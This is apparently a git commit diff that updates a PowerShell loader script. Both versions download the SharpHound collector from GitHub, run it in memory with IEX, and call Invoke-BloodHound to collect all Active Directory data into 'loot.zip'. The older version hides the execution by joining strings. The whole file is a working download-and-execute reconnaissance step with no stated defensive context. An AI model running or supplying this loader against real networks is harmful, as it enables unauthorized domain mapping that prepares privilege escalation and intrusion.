8f18b62d05777ebb8827632c4d7814c8f6e7dcdb
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 19:59:24 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,6 +1,6 @@
-$pre = '[ScriptBlock]::Create('
-$mid = '"IEX ([System.Net.WebClient]::new()).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1''); Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"'
-$post = ')'
-$joined = $pre + $mid + $post
-$sb = Invoke-Expression $joined
+$code = @'
+IEX (([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1'))
+Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
+'@
+$sb = [ScriptBlock]::Create($code)
 & $sb
